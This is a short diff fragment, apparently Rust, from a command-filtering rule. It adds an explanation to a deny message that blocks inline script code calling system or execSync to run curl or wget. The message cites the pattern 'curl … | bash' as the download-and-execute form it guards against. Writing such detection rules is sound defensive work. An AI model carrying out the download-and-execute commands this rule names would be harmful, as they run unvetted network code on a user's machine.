-                "blocked: `{bn}` inline code calls a subprocess \
-                 (`system`/`execSync`) to run curl/wget — \
-                 download-and-execute shape via scripting language.",
+            return Some(DenyReason::with_detail(
+                format!(
+                    "blocked: `{bn}` inline code calls a subprocess \
+                     (`system`/`execSync`) to run curl/wget — \
+                     download-and-execute shape via scripting language."
+                ),
+                format!(
+                    "the inline `{bn}` code contains a literal \
+                     `system(\"curl …\")` or `execSync(\"wget …\")` \
+                     call. That's the scripting-language form of the \
+                     H1 bash pipeline `curl … | bash` — a subprocess \
+                     fetches network content that the next line is \
+                     likely to execute. Prefer `{bn}`'s built-in HTTP \
+                     client (requests/fetch/Net::HTTP/etc.) which lets \
+                     you inspect the response before acting on it, \
+                     rather than shelling out."
+                ),
             ));
         }
     }
